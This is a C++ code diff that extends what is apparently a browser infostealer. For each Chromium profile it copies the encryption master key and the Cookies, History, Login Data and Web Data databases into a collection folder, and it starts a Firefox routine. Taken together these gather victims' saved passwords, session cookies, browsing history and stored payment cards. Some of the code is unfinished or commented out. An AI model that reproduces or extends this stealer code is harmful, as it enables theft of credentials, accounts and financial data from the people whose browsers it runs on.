@@ -29,9 +29,20 @@
 #include <vector>
 #include "../../dependencies/sqlite/sqlite3.h"
 
-
-
-
+/*
+#include "Base64.h"
+#include "binaryhandler.hpp"
+#include <cstdio>
+#include <iostream>
+#include "json.hpp"
+#include <map>
+//#include "plusaes_wrapper.hpp"
+#include <string>
+#include <windows.h>
+#include <Wincrypt.h>
+#pragma comment(lib, "user32")
+#pragma comment(lib, "Crypt32")
+*/
 
 namespace global 
 {
@@ -123,18 +134,25 @@ void browsers::Chromium()
                     int result = _mkdir(dir.c_str());
 
                     CopyMasterKey(browsersPaths[i], i);
-
                     GetCookies (browsersPaths[i], profiles[j], i);
+                    GetHistory(browsersPaths[i], profiles[j], i);
+                    GetLogins(browsersPaths[i], profiles[j], i);
+                    GetCards(browsersPaths[i], profiles[j], i);
                 }
             }
         }
     }
 }
 
-
 void browsers::FireFox()
 {
+    std::string path = global::roaming + "/Mozilla/Firefox";
+    std::string defPaths[] = global::defaultPath + "/Firefox";
 
+    if (std::filesystem::exists(path))
+    {
+
+    }
 }
 
 
@@ -152,7 +170,7 @@ int GetCookies(std::string path, std::string profile, int counter)
     std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";
 
     func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter]+ "/Cookies_" + profile);
-
+    /*
     // Open the cookies database
     sqlite3* db;
     int result = sqlite3_open(cookiesDbPath.c_str(), &db);
@@ -174,7 +192,7 @@ int GetCookies(std::string path, std::string profile, int counter)
     }
 
     // Open the output file for writing
-    std::ofstream outputFile("cookies.txt");
+    std::ofstream outputFile("cookies_"+ profile +".txt");
     if (!outputFile.is_open()) {
         std::cerr << "Failed to open output file" << std::endl;
         sqlite3_finalize(stmt);
@@ -190,13 +208,13 @@ int GetCookies(std::string path, std::string profile, int counter)
         std::string domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
 
         // C:\Users\darkd\AppData\Local\Google\Chrome\User Data\Local State
-        std::string domainDec = "";
+       // std::string domainDec = decrypt_c32(domain);
 
         // Write the cookie details to the file
         outputFile << "Name: " << name << std::endl;
         outputFile << "Value: " << value << std::endl;
         outputFile << "Domain: " << domain << std::endl;
-        outputFile << "-----------------------------" << std::endl;
+        outputFile << "-----------------------------" << std::endl << std::endl;
     }
 
     // Close the output file
@@ -209,21 +227,29 @@ int GetCookies(std::string path, std::string profile, int counter)
     std::cout << "Cookies exported to cookies.txt" << std::endl;
 
     return 0;
+    */
+    return 0;
 }
 
 void GetHistory(std::string path, std::string profile, int counter)
 {
+    std::string cookiesDbPath = path + "/" + profile + "/History";
 
+    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/History_" + profile);
 }
 
 void GetLogins(std::string path, std::string profile, int counter)
 {
+    std::string cookiesDbPath = path + "/" + profile + "/Login Data";
 
+    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Login Data_" + profile);
 }
 
 void GetCards(std::string path, std::string profile, int counter)
 {
+    std::string cookiesDbPath = path + "/" + profile + "/Web Data";
 
+    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Web Data_" + profile);
 }
 
 
